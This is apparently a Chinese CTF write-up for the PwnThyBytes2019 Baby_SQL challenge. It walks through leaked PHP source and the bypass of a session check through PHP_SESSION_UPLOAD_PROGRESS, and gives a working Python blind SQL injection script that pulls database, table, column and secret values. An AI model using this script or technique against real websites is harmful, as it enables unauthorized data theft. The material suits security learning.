---
title: PwnThyBytes2019-Baby_SQL
date: 2025-05-27 20:56:16
tags:
- 源码泄露
- sql盲注
- isset绕过
category:
- 刷题笔记
---

# PwnThyBytes2019-Baby_SQL

首先打开页面

查看源码发现是source.zip泄露

然后分析源码：

查看index.php中的代码,发现这里对所有的参数都用filter函数进行了过滤

```php
//index.php
<?php
session_start();
 
foreach ($_SESSION as $key => $value): $_SESSION[$key] = filter($value); endforeach;
foreach ($_GET as $key => $value): $_GET[$key] = filter($value); endforeach;
foreach ($_POST as $key => $value): $_POST[$key] = filter($value); endforeach;
foreach ($_REQUEST as $key => $value): $_REQUEST[$key] = filter($value); endforeach;
 
function filter($value)
{
    !is_string($value) AND die("Hacking attempt!");
 
    return addslashes($value);
}
 
isset($_GET['p']) AND $_GET['p'] === "register" AND $_SERVER['REQUEST_METHOD'] === 'POST' AND isset($_POST['username']) AND isset($_POST['password']) AND @include('templates/register.php');
isset($_GET['p']) AND $_GET['p'] === "login" AND $_SERVER['REQUEST_METHOD'] === 'GET' AND isset($_GET['username']) AND isset($_GET['password']) AND @include('templates/login.php');
isset($_GET['p']) AND $_GET['p'] === "home" AND @include('templates/home.php');
 
?>
```

---

`$SESSION`只有在`session_start()`之后才会有，如果直接访问这两个页面由于`!isset($_SESSION) AND die("Direct access on this script is not allowed!");`语句，会直接die报错。

**register.php**

```
//register.php
<?php
!isset($_SESSION) AND die("Direct access on this script is not allowed!");
include 'db.php';
 
(preg_match('/(a|d|m|i|n)/', strtolower($_POST['username'])) OR strlen($_POST['username']) < 6 OR strlen($_POST['username']) > 10 OR !ctype_alnum($_POST['username'])) AND $con->close() AND die("Not allowed!");
 
$sql = 'INSERT INTO `ptbctf`.`ptbctf` (`username`, `password`) VALUES ("' . $_POST['username'] . '","' . md5($_POST['password']) . '")';
($con->query($sql) === TRUE AND $con->close() AND die("The user was created successfully!")) OR ($con->close() AND die("Error!"));
?>  
```

**login.php**

```
//login.php
<?php
 
!isset($_SESSION) AND die("Direct access on this script is not allowed!");
include 'db.php';
 
$sql = 'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="' . $_GET['username'] . '" and password="' . md5($_GET['password']) . '";';
$result = $con->query($sql);
 
function auth($user)
{
    $_SESSION['username'] = $user;
    return True;
}
 
($result->num_rows > 0 AND $row = $result->fetch_assoc() AND $con->close() AND auth($row['username']) AND die('<meta http-equiv="refresh" content="0; url=?p=home" />')) OR ($con->close() AND die('Try again!'));
?>
```

在`login.php`中，存在非常明显的SQL注入：

```
$sql = 'SELECT `username`,`password` FROM `ptbctf`.`ptbctf` where `username`="' . $_GET['username'] . '" and password="' . 
```

---

**username`变量存在SQL注入，因此我们需要绕过`!isset($_SESSION)**

## 知识点 绕过!isset($_SESSION)

```
在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个叫session.upload_progress.enabled，默认为On，在这个选项被打开的前提下我们在multipart POST的时候传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()
```

---

因此我们可以构造文件上传请求，并且传入`data:session.upload_progress.enabled`这样就会自动开启`session_start()`就可以绕过对`isset($_SESSION)`的限制，然后后面就是常规的盲注。

exp：

```
import requests
import time
url = "http://6a742e0c-c6b0-49a3-b626-f5f0578d17f1.node3.buuoj.cn/templates/login.php"
 
files = {"file": "123456789"}
 
 
 
'''字段值'''
flag=''
for i in range(1,100):
    low = 32
    high = 128
    mid = (low+high)//2
    while (low < high):
        time.sleep(0.06)
        # payload_flag ={'username': "test\" or (ascii(substr((select group_concat(username) from ptbctf ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
        payload_flag = {
            'username': "test\" or (ascii(substr((select group_concat(secret) from flag_tbl ),{0},1))>{1}) #".format(i,mid),'password': 'test'}
        r = requests.post(url=url,params=payload_flag,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
                  cookies={"PHPSESSID": "test1"})
 
        print(payload_flag)
        if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
            low = mid +1
        else:
            high = mid
        mid = (low + high) // 2
    if(mid==32 or mid == 132):
        break
    flag +=chr(mid)
    print(flag)
 
print(flag)
 
# column=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_column ={'username': "test\" or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\'flag_tbl\' ),{0},1))>{1}) #".format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_column,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#
#         print(payload_column)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     column +=chr(mid)
#     print(column)
#
# print(column)
 
# '''表名'''
# table=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_table ={'username': 'test" or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\'ptbctf\'),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_table,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_table)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     table+=chr(mid)
#     print(table)
#
# print(table)
 
# '''数据库名'''
# database=''
# for i in range(1,100):
#     low = 32
#     high = 128
#     mid = (low+high)//2
#     while (low < high):
#         time.sleep(0.06)
#         payload_database ={'username': 'test" or (ascii(substr((select database()),{0},1))>{1}) #'.format(i, mid),'password': 'test'}
#         r = requests.post(url=url,params=payload_database,files=files, data={"PHP_SESSION_UPLOAD_PROGRESS": "123456789"},
#                   cookies={"PHPSESSID": "test1"})
#         print(payload_database)
#         if '<meta http-equiv="refresh" content="0; url=?p=home" />' in r.text:
#             low = mid +1
#         else:
#             high = mid
#         mid = (low + high) // 2
#     if(mid==32 or mid == 132):
#         break
#     database+=chr(mid)
#     print(database)
#
# print(database)
```





































